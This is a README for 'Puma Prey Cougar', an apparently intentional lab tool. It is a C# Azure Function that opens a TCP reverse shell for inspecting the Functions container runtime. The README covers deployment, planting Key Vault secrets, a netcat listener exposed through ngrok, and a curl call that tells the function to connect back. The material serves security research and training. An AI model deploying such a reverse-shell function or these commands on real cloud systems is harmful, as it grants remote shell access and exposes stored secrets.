# Puma Prey Cougar

Cougar is a C# function that can be deployed to the Azure to establish a TCP reverse shell for the purposes of introspecting the Azure Functions container runtime.

## Installing Prerequisites

* [.NET Core 3.1 SDK](https://dotnet.microsoft.com/download)
* [Azure CLI](https://github.com/Azure/azure-cli)
* [Terraform](https://learn.hashicorp.com/terraform/getting-started/install.html)

## Deploying the Function

### Native Deployment

Requires the Resource Group, Function App (.NET Core, Linux OS), App Service Plan, App Insights, and Storage Account to be created in US West.

```bash
func azure functionapp publish pumapreycougar
```

Then, enable the function identity to use an MSI account during execution.

### Terraform

NOTE: This needs work to deploy assets, etc.

```bash
cd src
dotnet publish
cd ../terraform
terraform init
export TF_VAR_UniqueString=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') # Save this value for future sessions.
az login
terraform apply
```

TODO: Upload cougar.png to the images blob.
TODO: Needs to create an identity and attach the function to the service principal created.
TODO: Grant read, container read to the blob created.

## Deploying Assets

Create some secrets and grant permissions to the function SA.

```
az keyvault secret set --vault-name pumaprey-cougar-vault  --name "cougar-database-user" --value "cougar_user"

az keyvault secret set --vault-name pumaprey-cougar-vault  --name "cougar-database-pass" --value "QnV0IHVuaWNvcm5zIGFwcGFyZW50bHkgZG8gZXhpc3Qu"

az keyvault set-policy --name pumaprey-cougar-vault -g pumaprey-cougar --object-id 0cbd41de-55c6-460d-b92b-837eddd0ea0d --secret-permissions get list
```

## Testing in Azure

Retrieve the API key in the Azure Portal by searching for "Function App", clicking on the new Function App resource, clicking "Manage", and clicking "Click to show" next to the default function key.

If you have [Netcat](http://netcat.sourceforge.net/) and [ngrok](https://ngrok.com/) installed, you can use this script:

```bash
script/cougar --url-id "cougar$TF_VAR_UniqueString" --api-key YOUR_API_KEY
```

Alternatively, you can do this manually by setting up a Netcat listener like so:

```bash
nc -l 4444
```

Then, to make your listener accessible from the public internet, consider using a service like ngrok:

```bash
ngrok tcp 4444
```

Finally, invoke your function, supplying your connection details and API key:

```bash
curl "https://cougar$TF_VAR_UniqueString.azurewebsites.net/api/Cougar?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER&code=YOUR_API_KEY"
```

Your listener will now act as a reverse shell for the duration of the function invocation.

## Teardown

```bash
terraform destroy
```

## Running Locally

Install [Azure Functions Core Tools](https://docs.microsoft.com/en-us/azure/azure-functions/functions-run-local) and run the following:

```bash
cd src
dotnet restore
dotnet build
func start
```

## Testing Locally

```bash
curl 'http://localhost:7071/api/Cougar?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER'
```

## Azure Function C# Template

```bash
func init Cougar --csharp --dotnet
func new --template "HTTP trigger" --name GetCougar
```
